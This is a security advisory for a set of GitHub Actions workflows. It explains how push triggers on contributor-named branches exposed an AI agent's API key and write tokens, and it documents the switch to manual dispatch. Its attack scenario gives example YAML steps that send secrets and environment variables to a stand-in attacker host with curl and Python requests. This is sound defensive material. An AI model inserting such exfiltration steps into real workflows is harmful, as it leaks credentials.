# Push Trigger Security Fix - Trust Boundary Issue

## Security Issue

**Title:** Contributor-controlled push workflows expose Jules secrets and write-capable GitHub tokens

**Severity:** Critical

**CVE/CWE:** CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)

## Problem Description

The healing, optimization, and quantum workflows previously used `push` triggers with branch-name patterns (`ai-optimize-/*`, `ai-fix-/*`, `ai-quantum-/*`) as trust boundaries. This created a critical security vulnerability because:

### How GitHub Actions Evaluates Push-Triggered Workflows

When a workflow is triggered by a `push` event:

1. **GitHub evaluates the workflow file from the pushed revision** - not from the default branch
2. **The checkout action operates on the pushed revision** - not a protected branch
3. **All steps execute with the permissions declared in the pushed workflow file**
4. **Secrets are exposed to jobs defined in the pushed workflow file**

### Attack Scenario

A contributor or compromised account with push access to create branches matching the patterns could:

1. **Create a malicious branch** (e.g., `ai-optimize/exfiltrate`)
2. **Modify the workflow file** in that branch to add a step like:
   ```yaml
   - name: Exfiltrate Secret
     run: |
       curl -X POST https://attacker.com/collect \
         -d "secret=${{ secrets.JULES_API_KEY }}"
   ```
3. **Modify dependency installation** to install malicious packages:
   ```yaml
   - name: Install Dependencies
     run: |
       pip install malicious-package
       python -c "import os; import requests; requests.post('https://attacker.com', data=os.environ)"
   ```
4. **Alter tests** to execute arbitrary code before Jules is invoked
5. **Change workflow permissions** within repository policy limits
6. **Push the branch** - the workflow automatically triggers with the attacker's modifications

### Why Branch Name Patterns Are Not Security Boundaries

Branch name patterns like `ai-optimize-/*` are **naming conventions**, not authorization controls:

- They control **which branches trigger the workflow**
- They do NOT control **which revision of the workflow file is evaluated**
- They do NOT control **which code is checked out and executed**
- They do NOT prevent **modification of the workflow itself**

### Why Environment Protection Alone Is Insufficient

The quantum workflow used a GitHub Environment (`environment: quantum-evolution`) with the assumption that required reviewers would provide protection. However:

1. **Environment protection only gates job execution** - it does NOT prevent:
   - Evaluation of the workflow file from the pushed revision
   - Checkout of attacker-controlled code
   - Modification of the workflow to change what happens after approval

2. **Environment protection is only effective if configured externally** - the YAML declaration alone provides no security if:
   - No required reviewers are configured
   - No deployment branch restrictions are set
   - The environment doesn't exist in repository settings

3. **Approval happens AFTER workflow evaluation** - by the time a reviewer sees the approval request:
   - The workflow file has already been parsed from the pushed revision
   - The attacker controls what will execute after approval
   - The reviewer cannot easily verify which workflow version will run

## Root Cause

The workflows used `on: push` with branch patterns as the trigger, creating a trust boundary failure where:

- **Trusted**: The workflow file and code from protected branches
- **Untrusted**: The workflow file and code from contributor-pushed branches
- **Failure**: The trigger mechanism did not distinguish between these trust levels

## Solution Implemented

### 1. Removed Dangerous Push Triggers

**jules-optimization-loop.yml** and **jules-healing-loop.yml**:
- ❌ Removed: `push: branches: ['ai-optimize-/*']` and `push: branches: ['ai-fix-/*']`
- ✅ Changed to: `workflow_dispatch` only (manual trigger)
- ✅ Added: Required `branch` input parameter for manual specification

**jules-quantum-evolution-loop.yml**:
- ❌ Removed: `push: branches: ['ai-quantum-/*']`
- ⚠️ Kept: `push: branches: ['main']` with strong security warnings
- ✅ Added: `workflow_dispatch` with optional `branch` input

### 2. Why Manual Trigger Is Secure

`workflow_dispatch` is secure because:

1. **Requires write access** - only users with write/maintain/admin access can trigger
2. **Evaluates workflow from default branch** - the workflow file comes from the branch where the workflow is defined (typically `main`), not from the target branch
3. **Explicit branch selection** - the user specifies which branch to operate on via input parameter
4. **Audit trail** - GitHub logs who triggered the workflow and with what parameters

### 3. Main Branch Push - Conditional Security

The quantum workflow retains `push: branches: ['main']` because:

✅ **SAFE IF**: Branch protection is configured on `main` to:
- Require pull request reviews before merging
- Require status checks to pass
- Prevent direct pushes (force all changes through PRs)

❌ **UNSAFE IF**: Direct pushes to `main` are allowed without review

The workflow now includes prominent security warnings documenting this requirement.

### 4. Updated All Branch References

Changed all hardcoded `${{ github.ref_name }}` references to:
```yaml
${{ inputs.branch || github.ref_name }}
```

This ensures the workflow operates on the user-specified branch when triggered manually, or the triggering branch when triggered by push to `main`.

## Required Branch Protection Configuration

To safely use the quantum workflow's `main` branch trigger, configure these branch protection rules:

### Settings → Branches → Branch protection rules → main

1. **Require a pull request before merging**
   - ✅ Require approvals: 1 (minimum)
   - ✅ Dismiss stale pull request approvals when new commits are pushed
   - ✅ Require review from Code Owners

2. **Require status checks to pass before merging**
   - ✅ Require branches to be up to date before merging
   - ✅ Add required status checks (e.g., CI, tests, linting)

3. **Require conversation resolution before merging**

4. **Do not allow bypassing the above settings**
   - ⚠️ Do NOT check "Allow specified actors to bypass required pull requests"

5. **Restrict who can push to matching branches**
   - ✅ Enable if you want to restrict direct pushes to specific users/teams
   - ✅ Or rely on "Require a pull request" to prevent all direct pushes

### Verification

Test that direct pushes are blocked:
```bash
git checkout main
echo "test" >> README.md
git commit -am "test direct push"
git push origin main
# Should fail with: "required status checks" or "required reviews"
```

## Migration Guide

### For Optimization Workflow Users

**Before (automatic on push):**
```bash
git checkout -b ai-optimize/my-feature
git push origin ai-optimize/my-feature
# Workflow triggered automatically
```

**After (manual trigger required):**
```bash
git checkout -b ai-optimize/my-feature
git push origin ai-optimize/my-feature
# Go to GitHub Actions UI → Jules Continuous Innovation & Automerge Loop → Run workflow
# Select branch: ai-optimize/my-feature
# Click "Run workflow"
```

### For Healing Workflow Users

**Before (automatic on push):**
```bash
git checkout -b ai-fix/broken-tests
git push origin ai-fix/broken-tests
# Workflow triggered automatically
```

**After (manual trigger required):**
```bash
git checkout -b ai-fix/broken-tests
git push origin ai-fix/broken-tests
# Go to GitHub Actions UI → Jules Automated Fix Loop → Run workflow
# Select branch: ai-fix/broken-tests
# Click "Run workflow"
```

### For Quantum Workflow Users

**Before (automatic on push to main or ai-quantum-/*):**
```bash
git checkout -b ai-quantum/refactor
git push origin ai-quantum/refactor
# Workflow triggered automatically - INSECURE
```

**After (manual trigger or merge to main):**

Option 1 - Manual trigger:
```bash
git checkout -b quantum-refactor
git push origin quantum-refactor
# Go to GitHub Actions UI → EQATS Quantum Architectural Evolution Loop → Run workflow
# Select branch: quantum-refactor
# Click "Run workflow"
```

Option 2 - Merge to main (requires branch protection):
```bash
git checkout -b quantum-refactor
git push origin quantum-refactor
# Create PR to main
# Get approval from reviewers
# Merge PR to main
# Workflow triggers automatically on main (secure because PR was reviewed)
```

## Alternative Solutions Considered

### 1. pull_request_target (Not Suitable)

`pull_request_target` evaluates the workflow from the base branch (secure) but:
- ❌ Designed for PR events, not continuous loops
- ❌ Would require restructuring the entire workflow logic
- ❌ Jules needs to push commits, which is complex with PRs
- ❌ Would still need careful checkout management to avoid checking out untrusted code

### 2. Separate Workflow for Validation (Partial Solution)

Create a separate workflow that:
- Triggers on `pull_request` (evaluates from base branch)
- Validates the changes
- Only then triggers the Jules workflow

Issues:
- ❌ Complex orchestration between workflows
- ❌ Still need to prevent direct push triggers
- ❌ Adds significant complexity for marginal benefit over manual trigger

### 3. Repository Dispatch (Over-Engineered)

Use `repository_dispatch` with external validation:
- ❌ Requires external service to validate and trigger
- ❌ Adds infrastructure complexity
- ❌ No significant security benefit over `workflow_dispatch`

### 4. Scheduled Workflow (Not Suitable)

Run on a schedule and check for branches:
- ❌ Delayed response (not immediate)
- ❌ Still needs to decide which branches to trust
- ❌ Doesn't solve the trust boundary problem

## Why workflow_dispatch Is the Best Solution

1. **Simple** - No complex orchestration or external services
2. **Secure** - Workflow file evaluated from default branch
3. **Auditable** - Clear log of who triggered what
4. **Flexible** - Can still be automated via GitHub API if needed
5. **Explicit** - Requires conscious decision to trigger
6. **Maintainable** - No additional infrastructure to maintain

## Automation Options

If you need to automate triggering (e.g., from another workflow or external system), you can use the GitHub API:

```bash
curl -X POST \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/workflows/jules-optimization-loop.yml/dispatches \
  -d '{"ref":"main","inputs":{"branch":"ai-optimize/my-feature"}}'
```

This is secure because:
- Requires a token with `workflow` scope (write access)
- Workflow file evaluated from the `ref` branch (typically `main`)
- Target branch specified via input parameter

## Testing the Fix

### Test 1: Verify Manual Trigger Works

1. Create a test branch: `git checkout -b ai-optimize/test`
2. Push the branch: `git push origin ai-optimize/test`
3. Verify workflow does NOT trigger automatically
4. Go to Actions → Jules Continuous Innovation & Automerge Loop → Run workflow
5. Select branch `ai-optimize/test` and click "Run workflow"
6. Verify workflow runs successfully

### Test 2: Verify Push Trigger Removed

1. Create a test branch: `git checkout -b ai-optimize/test2`
2. Push the branch: `git push origin ai-optimize/test2`
3. Go to Actions tab
4. Verify no workflow run was created for this push
5. Verify only manual triggers appear in the workflow runs

### Test 3: Verify Main Branch Protection (Quantum Workflow)

1. Ensure branch protection is configured on `main`
2. Try to push directly to main: `git push origin main`
3. Verify push is rejected with branch protection error
4. Create a PR, get approval, merge
5. Verify quantum workflow triggers on the merge (if configured)

## Security Checklist

- [x] Removed `push` triggers with contributor-controlled branch patterns
- [x] Changed to `workflow_dispatch` with explicit branch input
- [x] Updated all branch references to use input parameter
- [x] Added comprehensive security warnings in workflow comments
- [x] Documented branch protection requirements for `main` trigger
- [x] Created migration guide for users
- [x] Explained why environment protection alone is insufficient
- [x] Provided testing procedures

## References

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Understanding the risk of script injections](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
- [Using environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment)
- [Branch protection rules](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches)
- [Workflow dispatch event](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_dispatch)

## Conclusion

This fix eliminates the trust boundary vulnerability by removing automatic push triggers on contributor-controlled branches. The workflows now require explicit manual triggering (which requires write access and evaluates the workflow from the default branch) or operate only on the protected `main` branch where branch protection prevents unauthorized direct pushes.

The fix maintains functionality while significantly improving security posture by ensuring that:
1. Workflow files are evaluated from trusted branches
2. Secret exposure requires write access to the repository
3. All workflow executions are auditable and intentional
4. Branch protection rules are properly enforced
